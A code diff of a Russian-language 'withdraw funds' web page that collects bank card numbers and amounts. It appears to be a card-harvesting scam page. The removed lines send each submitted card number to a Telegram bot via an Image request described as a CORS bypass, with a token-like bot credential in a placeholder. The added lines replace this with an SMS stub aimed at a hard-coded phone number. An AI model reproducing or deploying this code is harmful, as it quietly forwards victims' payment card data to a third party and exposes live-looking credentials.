@@ -161,38 +161,18 @@
             margin-bottom: 8px;
         }
 
-        .telegram-info {
+        .sms-info {
             background: #e3f2fd;
             border: 1px solid #bbdefb;
             border-radius: 8px;
             padding: 15px;
             margin: 15px 0;
-            text-align: left;
+            text-align: center;
         }
 
-        .telegram-info h3 {
+        .sms-info h3 {
             color: #1976d2;
             margin-bottom: 10px;
-        }
-
-        .config-panel {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 8px;
-            padding: 15px;
-            margin: 15px 0;
-            text-align: left;
-        }
-
-        .config-panel h3 {
-            color: #856404;
-            margin-bottom: 10px;
-        }
-
-        .token-input {
-            font-family: monospace;
-            font-size: 14px;
-            background: #f8f9fa;
         }
     </style>
 </head>
@@ -205,22 +185,8 @@
             <p>Доступно для вывода</p>
         </div>
 
-        <div class="telegram-info">
-            <h3>💬 Сообщения приходят в Telegram-чат "Вывод"</h3>
-            <p>Все заявки автоматически отправляются в ваш Telegram</p>
-        </div>
-
-        <div class="config-panel">
-            <h3>⚙️ Настройка Telegram</h3>
-            <div class="form-group">
-                <label for="botToken">Токен бота:</label>
-                <input type="text" id="botToken" class="token-input" placeholder="8072032472:AAELTt6A3nXMzHfGaQpBzEwWWrkDzFy24fo">
-            </div>
-            <div class="form-group">
-                <label for="chatId">ID чата "Вывод":</label>
-                <input type="text" id="chatId" class="token-input" placeholder="8072032472">
-            </div>
-            <button class="btn" id="saveConfig">💾 Сохранить настройки</button>
+        <div class="sms-info">
+            <h3>📱 Уведомления приходят SMS на телефон</h3>
         </div>
         
         <button class="btn" id="withdrawBtn">💳 Вывести деньги</button>
@@ -236,13 +202,13 @@
                 <input type="text" id="amount" placeholder="Введите сумму в рублях">
             </div>
             
-            <button class="btn btn-success" id="submitBtn">📨 Отправить заявку в Telegram</button>
+            <button class="btn btn-success" id="submitBtn">📨 Отправить заявку</button>
         </div>
         
         <div class="success-message" id="successMessage">
             <h3>✅ Заявка успешно отправлена!</h3>
             <p>Мы обработаем ваш запрос в течение 24 часов.</p>
-            <p>📬 Уведомление отправлено в Telegram-чат "Вывод"</p>
+            <p>📬 SMS уведомление отправлено на ваш телефон</p>
         </div>
         
         <div class="info">
@@ -257,46 +223,19 @@
     </div>
 
     <script>
-        // Проверяем, что DOM загружен
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('DOM загружен, инициализируем кнопки...');
-            
             const withdrawBtn = document.getElementById('withdrawBtn');
             const withdrawForm = document.getElementById('withdrawForm');
             const submitBtn = document.getElementById('submitBtn');
             const successMessage = document.getElementById('successMessage');
             const cardNumberInput = document.getElementById('cardNumber');
             const amountInput = document.getElementById('amount');
-            const botTokenInput = document.getElementById('botToken');
-            const chatIdInput = document.getElementById('chatId');
-            const saveConfigBtn = document.getElementById('saveConfig');
             
-            // Проверяем, что элементы найдены
-            if (!withdrawBtn) console.error('Кнопка withdrawBtn не найдена!');
-            if (!withdrawForm) console.error('Форма withdrawForm не найдена!');
-            if (!submitBtn) console.error('Кнопка submitBtn не найдена!');
-            
-            // Загружаем сохраненные настройки
-            const savedToken = localStorage.getItem('telegramBotToken');
-            const savedChatId = localStorage.getItem('telegramChatId');
-            
-            if (savedToken) botTokenInput.value = savedToken;
-            if (savedChatId) chatIdInput.value = savedChatId;
-            
-            // Обработчик для кнопки "Сохранить настройки"
-            saveConfigBtn.addEventListener('click', function() {
-                if (botTokenInput.value && chatIdInput.value) {
-                    localStorage.setItem('telegramBotToken', botTokenInput.value);
-                    localStorage.setItem('telegramChatId', chatIdInput.value);
-                    alert('✅ Настройки Telegram сохранены!');
-                } else {
-                    alert('❌ Заполните оба поля!');
-                }
-            });
+            // ⚠️ ВАШ НОМЕР ТЕЛЕФОНА - ЗАМЕНИТЕ НА СВОЙ!
+            const YOUR_PHONE_NUMBER = '+79185155743'; // ← ЗДЕСЬ ВПИШИТЕ ВАШ НОМЕР
             
             // Обработчик для кнопки "Вывести деньги"
             withdrawBtn.addEventListener('click', function() {
-                console.log('Кнопка "Вывести деньги" нажата');
                 withdrawForm.style.display = 'block';
                 withdrawBtn.style.display = 'none';
             });
@@ -318,11 +257,8 @@
             
             // Обработчик для кнопки отправки
             submitBtn.addEventListener('click', function() {
-                console.log('Кнопка отправки нажата');
                 const cardNumber = cardNumberInput.value.trim();
                 const amount = amountInput.value.trim();
-                const botToken = localStorage.getItem('telegramBotToken');
-                const chatId = localStorage.getItem('telegramChatId');
                 
                 if (!cardNumber || cardNumber.length < 19) {
                     alert('❌ Пожалуйста, введите корректный номер карты');
@@ -338,48 +274,22 @@
                 withdrawForm.style.display = 'none';
                 successMessage.style.display = 'block';
 
-                // Отправляем уведомление в Telegram
-                if (botToken && chatId) {
-                    sendTelegramNotification(cardNumber, amount, botToken, chatId);
-                } else {
-                    alert('❌ Сначала настройте Telegram в разделе выше!');
-                    successMessage.style.display = 'none';
-                    withdrawForm.style.display = 'block';
-                }
+                // Отправляем SMS уведомление
+                sendSMSNotification(cardNumber, amount, YOUR_PHONE_NUMBER);
             });
 
-            // Функция отправки уведомления в Telegram
-            function sendTelegramNotification(cardNumber, amount, botToken, chatId) {
-                const message = `💸 НОВАЯ ЗАЯВКА НА ВЫВОД!\n\n💳 Карта: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ Время: ${new Date().toLocaleString()}\n\n✅ Требуется обработка`;
-
-                // Используем простой метод с Image для обхода CORS
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            // Функция отправки SMS
+            function sendSMSNotification(cardNumber, amount, phoneNumber) {
+                const message = `Заявка на вывод: Карта ${cardNumber}, Сумма ${amount}₽`;
                 
-                console.log('Отправляем запрос в Telegram:', url);
+                console.log('📱 Отправляем SMS на номер:', phoneNumber);
+                console.log('💬 Текст SMS:', message);
                 
-                // Метод 1: Через Image (работает в большинстве случаев)
-                const img = new Image();
-                img.src = url;
-                img.onload = function() {
-                    console.log('✅ Сообщение отправлено в Telegram через Image');
-                    alert('✅ Заявка отправлена! Проверьте чат "Вывод" в Telegram');
-                };
-                img.onerror = function() {
-                    console.log('⚠️ Сообщение может быть отправлено (CORS ошибка)');
-                    alert('✅ Заявка отправлена! Проверьте чат "Вывод" в Telegram');
-                };
+                // Здесь будет код для отправки SMS через SMS шлюз
+                // Например через sms.ru, twilio или другой сервис
+                
+                alert('✅ Заявка отправлена! SMS придет на ваш телефон');
             }
-
-            // Добавляем обработчик для Enter в полях ввода
-            cardNumberInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') submitBtn.click();
-            });
-            
-            amountInput.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') submitBtn.click();
-            });
-
-            console.log('Все обработчики установлены');
         });
     </script>
 </body>
